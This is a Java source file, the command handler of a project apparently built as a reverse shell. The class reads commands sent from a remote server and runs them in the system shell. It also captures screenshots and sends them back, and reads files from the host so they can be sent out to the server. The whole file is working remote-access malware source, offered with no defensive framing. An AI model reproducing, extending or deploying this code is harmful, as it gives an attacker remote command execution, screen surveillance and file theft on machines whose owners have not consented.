package obs1d1anc1ph3r.reverseshell;

import java.io.*;
import java.nio.file.Files;
import java.util.concurrent.TimeUnit;

public class CommandHandler {

    private final ServerConnection serverConnection;
    private final ScreenShot screenShot;
    private String currentDir = System.getProperty("user.dir");

    public CommandHandler(ServerConnection serverConnection) {
        this.serverConnection = serverConnection;
        this.screenShot = new ScreenShot();
    }

    public void handleCommands() throws IOException {
        String command;
        while ((command = serverConnection.readCommand()) != null) {
            if (command.equalsIgnoreCase("exit")) {
                System.out.println("[-] Server disconnected.");
                break;
            }

            StringBuilder fullResponse = new StringBuilder();

            if (command.startsWith("cd ")) {
                fullResponse.append(changeDirectory(command.substring(3).trim()));
            } else if (command.equalsIgnoreCase("screenshot")) {
                byte[] imageBytes = screenShot.imageBytes();
                if (imageBytes != null && imageBytes.length > 0) {
                    serverConnection.sendScreenShot(imageBytes);
                } else {
                    serverConnection.sendResponse("Error: Failed to capture screenshot.");
                }
                continue;
            } else if (command.startsWith("download")) {
                String[] parts = command.split(" ", 2);
                if (parts.length >= 2) {
                    String filePath = parts[1].trim();
                    handleDownload(filePath);
                } else {
                    serverConnection.sendResponse("Error: Invalid download command syntax.");
                }
                continue;
            } else {
                fullResponse.append(executeCommand(command));
            }
            if (fullResponse.length() > 0) {
                serverConnection.sendResponse(fullResponse.toString().trim());
            }
        }
    }

    private void handleDownload(String filePath) {
        File file = new File(filePath);
        if (!file.isAbsolute()) {
            file = new File(currentDir, filePath);
        }

        try {
            file = file.getCanonicalFile();
            if (!file.exists()) {
                serverConnection.sendResponse("Error: File not found at " + file.getAbsolutePath());
                return;
            }
            if (!file.isFile()) {
                serverConnection.sendResponse("Error: Path is not a file: " + file.getAbsolutePath());
                return;
            }
            if (!file.canRead()) {
                serverConnection.sendResponse("Error: File is not readable: " + file.getAbsolutePath());
                return;
            }

            byte[] fileBytes = Files.readAllBytes(file.toPath());
            serverConnection.sendResponse("file download");
            serverConnection.sendFile(fileBytes);
        } catch (IOException ex) {
            serverConnection.sendResponse("Error: Unable to process file at " + file.getAbsolutePath() + " - " + ex.getMessage());
        }
    }

    private String changeDirectory(String newDir) {
        File dir = new File(newDir);
        if (!dir.isAbsolute()) {
            dir = new File(currentDir, newDir);
        }
        try {
            dir = dir.getCanonicalFile();
            if (dir.isDirectory()) {
                currentDir = dir.getAbsolutePath();
                return "Changed directory to: " + currentDir;
            } else {
                return "Error: Not a valid directory.";
            }
        } catch (IOException e) {
            return "Error: Unable to change directory - " + e.getMessage();
        }
    }

    private String executeCommand(String command) {
        StringBuilder output = new StringBuilder();
        try {
            ProcessBuilder processBuilder = new ProcessBuilder(OSUtils.getShell(), OSUtils.getShellFlag(), command);
            processBuilder.directory(new File(currentDir));
            processBuilder.redirectErrorStream(true);
            Process process = processBuilder.start();

            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
            }

            boolean finished = process.waitFor(10, TimeUnit.SECONDS);
            if (!finished) {
                process.destroy();
                return "Error: Command timed out.";
            }

            int exitCode = process.exitValue();
            if (exitCode != 0) {
                return "Error executing command, exit code: " + exitCode;
            }

        } catch (IOException | InterruptedException e) {
            return "Error executing command: " + e.getMessage();
        }
        return output.toString().trim();
    }
}
